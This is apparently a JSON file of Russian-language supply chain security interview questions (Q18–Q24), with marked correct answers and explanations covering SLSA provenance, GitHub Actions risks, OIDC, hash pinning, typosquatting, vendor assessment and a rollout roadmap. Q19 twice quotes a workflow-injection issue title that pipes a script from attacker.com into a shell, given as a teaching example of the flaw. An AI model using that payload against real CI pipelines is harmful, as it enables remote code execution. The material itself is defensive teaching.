+              "text": "`Provenance` — подписанные метаданные о происхождении артефакта: коммит, builder, timestamp, окружение. По схеме `SLSA Provenance v1` это `buildDefinition` (buildType, source `git+...@sha1:...`) и `runDetails` (builder id, invocationID, startedOn/finishedOn). Даёт проверяемое «этот JAR собран нашим GitHub Actions из коммита X»; на `SLSA L3+` provenance non-falsifiable.",
+              "correct": true,
+              "sections": {
+                "explanation": "Provenance связывает артефакт с его происхождением для доверия и incident response: при компрометации библиотеки находятся все артефакты, ссылающиеся на неё. На L3+ builder подписывает provenance так, что разработчик её не подделает.",
+                "example": "`slsa-verifier verify-artifact myapp.tar.gz --source-uri github.com/myorg/myrepo --source-tag v1.0 --provenance-path myapp.intoto.jsonl` проверяет, что артефакт собран из ожидаемого репо и тега.",
+                "when_to_apply": "Provenance генерируют для всех артефактов, идущих в деплой, и проверяют политикой в admission controller на соответствие ожидаемому репозиторию и ветке.",
+                "edge_cases": "Provenance бесполезна без верификации источника: если не проверять, что `source-uri` и builder совпадают с ожидаемыми, артефакт от чужого репо с валидной (но не той) provenance пройдёт.",
+                "related": "[[supply-chain-security-interview#Q12]] in-toto attestations; [[supply-chain-security-interview#Q7]] SLSA framework; [[supply-chain-security-interview#Q8]] SLSA L3 non-falsifiable provenance."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "`Provenance` на `SLSA L3` falsifiable: разработчик может вручную отредактировать её перед публикацией.",
+              "correct": false,
+              "sections": {
+                "what_actually": "На `SLSA L3` provenance именно non-falsifiable: её подписывает builder через ephemeral identity/OIDC, и разработчик подделать её не может.",
+                "source_of_confusion": "Кажется, что метаданные — это обычный текст, который автор волен переписать.",
+                "if_it_were_true": "Тогда L3 не давал бы гарантий целостности, но non-falsifiability и есть его ключевое требование.",
+                "how_it_should_be": "На L3 provenance non-falsifiable: подписывается доверенным builder, а не разработчиком."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "Provenance генерируется только вручную в конце релиза разработчиком, который описывает сборку в свободной форме.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Provenance генерируется автоматически builder-ом (`slsa-github-generator`, GitLab, Tekton Chains) по строгой схеме, а не вручную в свободной форме.",
+                "source_of_confusion": "«Метаданные о сборке» звучат как документ, который оформляют руками.",
+                "if_it_were_true": "Тогда её нельзя было бы машинно верифицировать через `slsa-verifier`, но проверка автоматическая по схеме.",
+                "how_it_should_be": "Provenance генерируется автоматически по схеме SLSA и машинно проверяется верификатором."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 19,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Какие supply chain риски есть в GitHub Actions?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "Pinning action на ветку `@main` безопаснее, чем на commit SHA, потому что вы всегда получаете последнюю проверенную версию.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Pinning на `@main` опасен: исполняется любой коммит ветки, и компрометация action даёт RCE всем потребителям; безопасен именно pin на immutable commit SHA.",
+                "source_of_confusion": "«Последняя версия» интуитивно кажется «самой исправленной и безопасной».",
+                "if_it_were_true": "Тогда атакующий не мог бы навредить через push в action, но именно так это и работает с `@main`.",
+                "how_it_should_be": "Action пинят на commit SHA; обновляют осознанно (Dependabot обновляет SHA с ревью)."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "Использование `${{ github.event.issue.title }}` прямо внутри `run:` полностью безопасно, GitHub экранирует значение.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Это классический workflow injection: значение подставляется в shell как есть, и спецсимволы в заголовке выполняются как команды.",
+                "source_of_confusion": "Кажется, что шаблонизатор `${{ }}` сам экранирует данные, как параметризованный SQL.",
+                "if_it_were_true": "Тогда заголовок `\"); curl attacker.com | sh # ` был бы безвреден, но он исполняет произвольную команду.",
+                "how_it_should_be": "Внешний ввод передают через `env:` и читают как `\"$VAR\"`, а не вставляют напрямую в команду."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "Основные риски: компрометация сторонних actions (pinning на `@main` запускает любой коммит — фикс: pin на commit SHA), pwn requests (`pull_request_target` запускает код форка с write-правами и секретами), утечка секретов в лог, privilege escalation на self-hosted runner, workflow injection через `${{ github.event.* }}` в shell, и широкие дефолтные права `GITHUB_TOKEN`.",
+              "correct": true,
+              "sections": {
+                "explanation": "Корень рисков — выполнение недоверенного кода с доверенными правами и секретами. Защита: pin actions на SHA, минимальные `permissions:`, избегание `pull_request_target`, ephemeral runners и квотинг/env для внешних данных.",
+                "example": "Workflow injection: `run: echo \"${{ github.event.issue.title }}\"` с заголовком issue `\"); curl attacker.com | sh # ` исполняет произвольную команду; фикс — передать значение через `env:` и читать как `\"$TITLE\"`.",
+                "when_to_apply": "Эти контролы применяют при настройке любого публичного или чувствительного workflow, особенно обрабатывающего PR от форков или внешний ввод.",
+                "edge_cases": "Pinning на тег (`@v4`) недостаточен: тег мутабелен и атакующий, скомпрометировав action, может перевесить его на вредоносный коммит — поэтому пинят именно на immutable commit SHA.",
+                "related": "[[supply-chain-security-interview#Q20]] OIDC вместо хранимых креденшелов; [[supply-chain-security-interview#Q21]] pinned dependencies (SHA); [[supply-chain-security-interview#Q24]] roadmap с минимизацией GITHUB_TOKEN."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "`pull_request_target` — рекомендуемый безопасный способ запускать workflow на PR из форков с доступом к секретам.",
+              "correct": false,
+              "sections": {
+                "what_actually": "`pull_request_target` опасен: он запускается с write-правами и секретами в контексте форка, чем пользуются pwn requests; для форков безопаснее `pull_request` (без секретов).",
+                "source_of_confusion": "Название намекает, что событие «специально для PR», поэтому кажется правильным выбором.",
+                "if_it_were_true": "Тогда код форка не мог бы добраться до секретов, но `pull_request_target` как раз даёт ему такой контекст.",
+                "how_it_should_be": "Для форков используют `pull_request` без секретов; `pull_request_target` избегают или жёстко ограничивают."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 20,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Как использовать OIDC для CI, чтобы избавиться от long-lived credentials?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "OIDC для CI работает так: вы один раз сохраняете AWS access key в GitHub Secrets, а OIDC лишь шифрует его при передаче.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Суть OIDC — вообще НЕ хранить долгоживущие ключи: вместо них CI получает временные креды по JWT; никакой постоянный access key в секретах не нужен.",
+                "source_of_confusion": "Привычная модель «положи ключ в секреты» переносится на OIDC как «то же, но безопаснее».",
+                "if_it_were_true": "Тогда главная выгода OIDC (no long-lived keys) пропала бы, но именно ради неё его и внедряют.",
+                "how_it_should_be": "OIDC выдаёт short-lived креды по доверию к JWT; долгоживущие ключи удаляют полностью."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "Временные креды, полученные через OIDC, действуют бессрочно, пока workflow явно их не отзовёт.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Креды short-lived (порядка часа) и истекают сами; именно ограниченное время жизни снижает риск при утечке.",
+                "source_of_confusion": "Кажется, что раз креды «получены», они действуют как обычный долгоживущий ключ.",
+                "if_it_were_true": "Тогда утечка временных кредов была бы так же опасна, как утечка постоянного ключа, но их короткий TTL это смягчает.",
+                "how_it_should_be": "OIDC-креды живут ~1 час и истекают автоматически; ротация не требуется."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "Для OIDC достаточно широкого условия по одному только issuer — указывать конкретный репозиторий и ветку в trust policy не нужно.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Условие должно быть узким (`sub` с конкретным репо/веткой): иначе роль сможет принять любой workflow организации, что сводит на нет fine-grained trust.",
+                "source_of_confusion": "Проверка issuer выглядит достаточной гарантией, что запрос «от GitHub».",
+                "if_it_were_true": "Тогда чужой репо в той же организации мог бы принять вашу роль, что и есть дыра в безопасности.",
+                "how_it_should_be": "Trust policy ограничивают по `sub` (конкретный репо и ветка), а не только по issuer."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "Проблема: CI хранит долгоживущие облачные креды → риск утечки. Решение — OIDC workload federation: CI-провайдер (GitHub/GitLab/CircleCI) выпускает JWT с claims (репо, ветка), облако доверяет этому JWT и выдаёт short-lived креды. В GitHub Actions нужен `permissions: id-token: write`, затем `aws-actions/configure-aws-credentials` с `role-to-assume`; AWS через trust policy проверяет подпись JWT и условие `sub`.",
+              "correct": true,
+              "sections": {
+                "explanation": "Flow: workflow стартует → GitHub чеканит JWT с claims → action шлёт его в `AssumeRoleWithWebIdentity` → AWS проверяет подпись (публичные ключи GitHub) и условие (репо/ветка) → возвращает временные креды на ~1 час. Долгоживущих ключей в секретах нет.",
+                "example": "Trust policy AWS требует `token.actions.githubusercontent.com:sub == repo:myorg/myrepo:ref:refs/heads/main` — креды получит только workflow из нужного репо и ветки.",
+                "when_to_apply": "OIDC применяют, чтобы убрать все долгоживущие облачные ключи из CI-секретов; поддерживается AWS, GCP, Azure, Vault и многими другими.",
+                "edge_cases": "Слишком широкое условие в trust policy (например только по issuer без `sub` репо/ветки) позволит любому workflow организации принять роль — условие должно быть узким (конкретный репо и ветка).",
+                "related": "[[supply-chain-security-interview#Q19]] риски GitHub Actions; [[supply-chain-security-interview#Q11]] OIDC как identity в keyless; [[supply-chain-security-interview#Q24]] roadmap: замена long-lived creds на OIDC."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 21,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Чем отличается pinning зависимостей по версии и по хешу?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "Version pin (`\"lodash\": \"4.17.21\"`) фиксирует версию, НО реестры допускают overwrite, и скомпрометированный мейнтейнер может перезалить тот же номер с вредоносным tarball. Hash pin (lockfile с `integrity: sha512-...`) проверяет хеш при установке: несоответствие → fail. Hash pin даёт tamper detection и точную воспроизводимость («right version, wrong bytes» не пройдёт).",
+              "correct": true,
+              "sections": {
+                "explanation": "Version pin защищает только от смены номера версии, но не от подмены содержимого под тем же номером. Hash pin привязывает к конкретным байтам, поэтому ловит republish с вредоносом и подмену на mirror/cache.",
+                "example": "`npm` хранит хеши в `package-lock.json` и `npm ci` их enforce-ит; `pip` — `pip install --require-hashes -r requirements.txt`; `Docker` — `FROM ubuntu@sha256:...` (pin по digest, а не tag).",
+                "when_to_apply": "Hash pin применяют везде, где важна защита от dependency substitution и подменённых mirror/cache, особенно в production-сборках через `npm ci`/`--require-hashes`.",
+                "edge_cases": "В `Java`/`Maven` нет нативного hash pin — нужен `Maven Enforcer Plugin` с проверкой хешей или `Gradle` dependency locking; без этого Maven-проекты уязвимы к «right version, wrong bytes».",
+                "related": "[[supply-chain-security-interview#Q22]] защита от typosquatting; [[supply-chain-security-interview#Q19]] pin actions по SHA; [[supply-chain-security-interview#Q16]] hash pin как основа воспроизводимости."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "Version pin (`\"lodash\": \"4.17.21\"`) полностью защищает от подмены содержимого, потому что опубликованную версию нельзя перезаписать.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Version pin не гарантирует неизменность байт: реестры допускают overwrite, и скомпрометированный мейнтейнер может перезалить тот же номер с вредоносом — нужен hash pin.",
+                "source_of_confusion": "Кажется, что «версия 4.17.21» — это навсегда зафиксированный неизменный артефакт.",
+                "if_it_were_true": "Тогда hash pin был бы избыточен, но атаки republish под тем же номером реальны.",
+                "how_it_should_be": "Защиту от подмены байт даёт hash pin (lockfile с integrity), а не только номер версии."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "Hash pin и version pin — это одно и то же, просто хеш короче записывать, чем номер версии.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Это разные механизмы: version pin фиксирует номер, hash pin — точные байты через `integrity`-хеш; хеш длиннее и проверяется при установке.",
+                "source_of_confusion": "Оба «закрепляют» зависимость, поэтому их считают взаимозаменяемыми.",
+                "if_it_were_true": "Тогда `npm ci` не отличался бы от обычного pin, но он именно enforce-ит хеши из lockfile.",
+                "how_it_should_be": "Version pin = номер версии; hash pin = криптографический хеш байт; второе строже."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "`Java`/`Maven` имеет нативный встроенный hash pin зависимостей из коробки, как `go.sum`.",
+              "correct": false,
+              "sections": {
+                "what_actually": "В `Maven` нативного hash pin нет: используют `Maven Enforcer Plugin` с проверкой хешей или `Gradle` dependency locking; нативный `go.sum` — это про Go.",
+                "source_of_confusion": "Раз у Go есть `go.sum`, кажется, что и Maven делает то же по умолчанию.",
+                "if_it_were_true": "Тогда Maven-проекты были бы защищены от «right version, wrong bytes» автоматически, но это не так.",
+                "how_it_should_be": "В Maven hash pin добавляют плагином/locking-ом; из коробки его нет, в отличие от `go.sum`."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 22,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Как защититься от typosquatting?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "Главная защита от typosquatting — это антивирус на машине разработчика, который сканирует установленные пакеты.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Антивирус не знает контекста пакетных реестров; защищают internal registry, allowlists, scoped packages, SCA-ревью и pinning, а не сигнатурный антивирус.",
+                "source_of_confusion": "Любую «вредоносную установку» интуитивно связывают с антивирусной защитой.",
+                "if_it_were_true": "Тогда хватило бы поставить антивирус, но он не отличит `reqeusts` от `requests` по поведению.",
+                "how_it_should_be": "Защита — на уровне процесса зависимостей (registry, scopes, review, pinning), а не endpoint-антивируса."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "`Typosquatting` — публикация пакета с именем, похожим на популярный (`electorn` вместо `electron`, `reqeusts` вместо `requests`), в расчёте на опечатку. Защиты: внутренний registry с ветированными пакетами, allowlists в CI, scoped packages (`@myorg/mylib`), SCA-ревью новых зависимостей (`Socket.dev`, `Deps.dev`), задержка обновления свежих пакетов (<7 дней), human review критичных зависимостей, регистрация своих типичных опечаток.",
+              "correct": true,
+              "sections": {
+                "explanation": "Защита многослойна: техническая (internal registry, scopes, allowlists, pinning) плюс процессная (review новых deps, time-delay, проактивная регистрация typo-имён). Один контроль не закрывает все сценарии.",
+                "example": "Внутренний npm/PyPI mirror отдаёт только ветированные пакеты: `npm install X` сначала бьёт во внутренний registry, и подсунуть `reqeusts` снаружи не получается.",
+                "when_to_apply": "Эти меры применяют при добавлении любых внешних зависимостей, особенно в командах с большим числом разработчиков и частым добавлением новых пакетов.",
+                "edge_cases": "`protestware` и self-sabotage мейнтейнера (`colors` 2022) typosquatting-защитой не ловятся — имя легитимное; тут спасают time-delay upgrade и pinning, а не проверка похожести имён.",
+                "related": "[[supply-chain-security-interview#Q3]] typosquatting как вектор атаки; [[supply-chain-security-interview#Q21]] pinned dependencies; [[supply-chain-security-interview#Q23]] vendor risk assessment."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "От typosquatting полностью защищает простое включение auto-merge всех обновлений зависимостей сразу после публикации.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Наоборот: мгновенный auto-merge свежих пакетов усиливает риск; защищает time-delay (не обновлять пакеты младше ~7 дней) и review новых deps.",
+                "source_of_confusion": "Автоматизация ассоциируется с безопасностью, поэтому auto-merge кажется защитной мерой.",
+                "if_it_were_true": "Тогда чем быстрее тянуть новое, тем безопаснее, но именно свежие вредоносные пакеты так и проникают.",
+                "how_it_should_be": "Свежие пакеты выдерживают карантин (time-delay) и ревьюят, а не auto-merge-ят немедленно."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "Scoped packages (`@myorg/mylib`) делают код быстрее за счёт CDN и не имеют отношения к безопасности имён.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Scopes резервируют пространство имён организации и снижают путаницу/подмену имён — это именно security-мера против typosquatting, а не оптимизация скорости.",
+                "source_of_confusion": "Префикс `@` похож на технический namespace, поэтому его роль в безопасности упускают.",
+                "if_it_were_true": "Тогда scopes не упоминали бы среди защит от typosquatting, но они там ключевые.",
+                "how_it_should_be": "Scoped packages резервируют имя организации и предотвращают подмену; к скорости это не относится."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 23,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Как проводить vendor risk assessment при онбординге стороннего ПО/SaaS?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "Vendor risk assessment — это разовая проверка только цены и функционала ПО без анализа безопасности.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Это именно оценка рисков безопасности и данных (сертификации, шифрование, auth, sub-processors), а не сравнение цен и фич.",
+                "source_of_confusion": "«Оценка вендора» в обиходе ассоциируется с закупкой и стоимостью.",
+                "if_it_were_true": "Тогда не запрашивались бы SOC 2 и pen-test отчёты, но именно они в центре assessment.",
+                "how_it_should_be": "Vendor risk assessment фокусируется на security posture, data handling и supply chain вендора."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "Все вендоры оцениваются одинаково глубоко независимо от их критичности для системы.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Вендоров тиерят: Tier 1 (auth, cloud) — высокий скрутиний неделями, Tier 3 (утилиты) — базовая проверка; глубина зависит от критичности.",
+                "source_of_confusion": "Кажется «честным» применять единый стандарт ко всем подряд.",
+                "if_it_were_true": "Тогда ресурсы тратились бы поровну на критичный auth-провайдер и мелкую утилиту, что неэффективно.",
+                "how_it_should_be": "Глубину проверки масштабируют по тиеру риска: критичные — глубоко, утилиты — базово."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "Оценивают security posture (SOC 2 Type II / ISO 27001, pen-test отчёты, история breach), data handling (где хранятся данные, шифрование at rest/in transit, GDPR/CCPA), access & auth (SSO/SAML/OIDC, MFA, RBAC, audit logs), supply chain вендора (sub-processors, SBOM) и operational (SLA, status page, backup). Вендоров тиерят: Tier 1 (auth/cloud) — высокий скрутиний, Tier 3 (утилиты) — базовый.",
+              "correct": true,
+              "sections": {
+                "explanation": "Цель — понять риск до покупки и периодически переоценивать. Используют security questionnaires (SIG Lite, CAIQ), платформы (`Whistic`, `OneTrust`) и trust centers вендора, а критичность определяет глубину проверки.",
+                "example": "Для Tier 1 auth-провайдера запрашивают SOC 2 Type II, pen-test отчёт, incident response plan и SBOM; для Tier 3 утилиты ограничиваются базовым опросником.",
+                "when_to_apply": "Vendor risk assessment проводят при онбординге любого 3rd-party ПО/SaaS и на ежегодной переоценке, а также при renewal-чекпоинте.",
+                "edge_cases": "Для Tier 1 ревью занимает недели — начинать надо заранее; пропуск ongoing-мониторинга опасен: вендор без breach на онбординге может скомпрометироваться позже (мониторят новости, HIBP).",
+                "related": "[[supply-chain-security-interview#Q22]] защита от typosquatting; [[supply-chain-security-interview#Q4]] SBOM от вендора; [[supply-chain-security-interview#Q24]] roadmap с формализацией vendor-процесса."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "После онбординга вендора переоценивать его безопасность больше не нужно — достаточно первичной проверки.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Нужна ongoing-переоценка: ежегодный re-assessment, мониторинг breach (новости, HIBP) и renewal-чекпоинт, потому что вендор может скомпрометироваться позже.",
+                "source_of_confusion": "Первичная проверка создаёт ощущение, что риск зафиксирован навсегда.",
+                "if_it_were_true": "Тогда поздняя компрометация вендора оставалась бы незамеченной, но именно поэтому мониторинг непрерывен.",
+                "how_it_should_be": "Vendor risk — это непрерывный процесс с ежегодной переоценкой и мониторингом инцидентов."
+              }
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "q_number": 24,
+      "blocks": [
+        {
+          "block_idx": 0,
+          "question_text": "Как выглядит прагматичный roadmap внедрения supply chain security?",
+          "options": [
+            {
+              "order": 0,
+              "label": "A",
+              "text": "Правильный порядок — сразу начать с enforcement: первым делом блокировать все неподписанные образы admission controller-ом.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Enforcement идёт в последнюю очередь (Phase 4): сначала visibility и harden build, иначе блокировка без готовой подписи/attestations остановит все деплои.",
+                "source_of_confusion": "Жёсткая блокировка кажется самым «безопасным» и потому первоочередным шагом.",
+                "if_it_were_true": "Тогда команда заблокировала бы собственные деплои до настройки подписи, что сломало бы pipeline.",
+                "how_it_should_be": "Сначала видимость и подпись, затем enforcement; блокировка — финальная фаза, не стартовая."
+              }
+            },
+            {
+              "order": 1,
+              "label": "B",
+              "text": "Чем больше разных security-инструментов внедрить одновременно, тем лучше защита — tool sprawl это благо.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Tool sprawl — это ловушка: десяток одновременно внедрённых инструментов даёт хаос и нерелевантные алерты; начинают с 2-3 хорошо интегрированных.",
+                "source_of_confusion": "Кажется, что больше инструментов = больше покрытия = больше безопасности.",
+                "if_it_were_true": "Тогда roadmap советовал бы внедрять всё сразу, но он явно предупреждает против tool sprawl.",
+                "how_it_should_be": "Начинают с 2-3 интегрированных инструментов и расширяют постепенно по фазам."
+              }
+            },
+            {
+              "order": 2,
+              "label": "C",
+              "text": "Reproducible и hermetic builds — это первый шаг roadmap, с которого начинают любую команду.",
+              "correct": false,
+              "sections": {
+                "what_actually": "Reproducible/hermetic builds — это advanced-фаза (Phase 5), а не старт; начинают с базовой видимости (Dependabot, SBOM, сканеры).",
+                "source_of_confusion": "Технически сложные темы кажутся «основой», с которой надо стартовать.",
+                "if_it_were_true": "Тогда новички сразу внедряли бы `Bazel`/`Nix`, но это дорогой шаг для зрелых команд, не для старта.",
+                "how_it_should_be": "Старт — это visibility (Phase 1); reproducible/hermetic builds откладывают на advanced-фазу."
+              }
+            },
+            {
+              "order": 3,
+              "label": "D",
+              "text": "Поэтапно: Phase 1 Visibility (Dependabot, SBOM в CI через Syft, скан контейнеров Trivy, code scanning) → Phase 2 Harden build (pin actions на SHA, минимум `GITHUB_TOKEN`, OIDC вместо long-lived creds, branch protection, signed commits) → Phase 3 Attestations (Cosign keyless, SLSA L3 provenance, SBOM/vuln attestation) → Phase 4 Enforce (admission controller Kyverno, только signed images, формальный vendor-процесс) → Phase 5 Advanced (reproducible/hermetic builds, VEX, red team).",
+              "correct": true,
+              "sections": {
+                "explanation": "Порядок — от видимости к enforcement: сначала узнать, что есть (SBOM, сканеры), затем укрепить сборку, потом добавить подписанные attestations, и только затем жёстко блокировать на их основе. Метрики: % репо с Dependabot, % подписанных артефактов, MTTR по CVE.",
+                "example": "Команда стартует с включения `Dependabot` и `Trivy` в CI (Phase 1), через месяц-два пинит actions на SHA и переходит на OIDC (Phase 2), затем подписывает образы `Cosign` (Phase 3).",
+                "when_to_apply": "Этот roadmap применяют как план поэтапного внедрения, не пытаясь сделать всё сразу: начинают с 2-3 хорошо интегрированных инструментов и расширяют.",
+                "edge_cases": "Главная ловушка — tool sprawl: попытка внедрить десяток инструментов одновременно ведёт к хаосу и нерелевантным алертам; начинают с малого и расширяют по мере зрелости.",
+                "related": "[[supply-chain-security-interview#Q4]] SBOM (Phase 1); [[supply-chain-security-interview#Q20]] OIDC (Phase 2); [[supply-chain-security-interview#Q12]] attestations и admission controllers (Phase 3-4)."
+              }
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
